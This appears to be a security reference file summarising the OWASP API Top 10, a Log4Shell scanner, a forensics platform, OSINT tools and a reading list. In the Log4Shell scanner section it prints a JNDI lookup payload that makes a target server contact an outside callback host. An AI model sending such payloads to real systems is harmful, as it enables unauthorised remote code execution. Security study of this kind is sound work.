# API Security + Forensics + Tools — Final Reference
# Sources: OWASP API Top 10, LogMePwn, Kuiper, securitytrails, remaining books
# For Killer Queen v3

---

## OWASP API SECURITY TOP 10 (2019)

A1: Broken Object Level Authorization — IDOR on API endpoints, insufficient per-object access checks
A2: Broken Authentication — Weak token generation, credential stuffing, lack of MFA
A3: Excessive Data Exposure — API returns all object properties, relying on client to filter
A4: Lack of Resources & Rate Limiting — No limits on API calls → DoS, brute force
A5: Broken Function Level Authorization — Regular user accesses admin API functions
A6: Mass Assignment — Binding user input to object properties without filtering (isAdmin=true)
A7: Security Misconfiguration — Verbose errors, unnecessary HTTP methods, CORS misconfig
A8: Injection — SQL, NoSQL, Command Injection in API parameters
A9: Improper Assets Management — Old API versions exposed, undocumented endpoints
A10: Insufficient Logging & Monitoring — No audit trail for API abuse

---

## LOGME PWN — Log4J Scanner (0xInfection)

Multi-protocol Log4Shell (CVE-2021-44228) scanner:
- Protocols: HTTP, IMAP, SSH, FTP
- Canary Tokens integration for OOB detection
- CIDR range scanning
- Custom payloads with $DNSNAME$ placeholder
- High concurrency (default 10 threads, scalable to 1000s)
- HTTP customization: methods, headers, JSON/XML/form body
- Payload sample:
  ```
  ${jndi:ldap://$DNSNAME$.callback.example.com/a}
  ```

---

## KUIPER — Digital Forensics Platform (Voulnet)

Collaborative DFIR platform: Flask + Elasticsearch + MongoDB + Redis + Celery

Parsers (evidence ingestion):
- BrowserHistory, SRUM, CSV, Recyclebin, Scheduled Tasks
- Prefetch, Windows Events, Amcache, bits_admin
- Jumplist, MFT (Master File Table), RUA (Registry)
- Shellbags, Shimcache, Shortcuts (lnk), UsnJrnl
- WMI_Persistence

Use case: Parse forensic artifacts → search/correlate across team → timeline visualization

---

## SECURITYTRAILS ECOSYSTEM (8 repos)

Most valuable: osint-mcp-server — 37 OSINT tools, 12 sources (Shodan, VirusTotal, Censys,
SecurityTrails, DNS recon, WHOIS, cert transparency, BGP routing, Wayback Machine, GeoIP)
→ Automated attack surface mapping via MCP protocol for AI agents

Other tools: submonitor (subdomain alerts to Slack/Discord/Telegram), get-acq (company
acquisition mapping), NameScraper (Selenium domain search), securitytrails API wrappers

---

## OWASP WSTG v4.1 (Web Security Testing Guide)

Updated version of the comprehensive testing methodology. Structure:
- Information Gathering (OTG-INFO-001 through -010)
- Configuration Management Testing (OTG-CONFIG-001 through -008)
- Identity Management Testing (OTG-IDENT-001 through -007)
- Authentication Testing (OTG-AUTHN-001 through -010)
- Authorization Testing (OTG-AUTHZ-001 through -004) — IDOR, privilege escalation
- Session Management Testing (OTG-SESS-001 through -009)
- Input Validation Testing (OTG-INPVAL-001 through -018) — XSS, SQLi, CMDi, etc.
- Error Handling, Cryptography, Business Logic, Client-Side Testing

---

## REMAINING BOOKS — STATUS

13 books remain unread. Priority categorization:

HIGH VALUE (offensive techniques):
- Windows Malware Analysis Essentials — malware reverse engineering specific to Windows
- Practical Web Penetration Testing — hands-on pentesting methodology
- Webbots, Spiders, And Screen Scrapers — web scraping techniques for recon

REFERENCE VALUE (defensive/general):
- The Practice of Network Security Monitoring — NSM methodology
- Network Forensics 2012 — forensic investigation techniques
- The Art of Memory Forensics — memory analysis
- WSTG v4.1 — web security testing guide (read)
- OWASP API Security Top 10 (read)

BACKGROUND VALUE (certification/large reference):
- Sybex CISSP 8th Edition — 55K lines, general security
- Official (ISC)2 CCSP CBK — 29K lines, cloud security
- Hacking Secret Ciphers With Python — 22K lines, cryptography
- Antivirus Hackers Handbook — 20K lines, AV internals
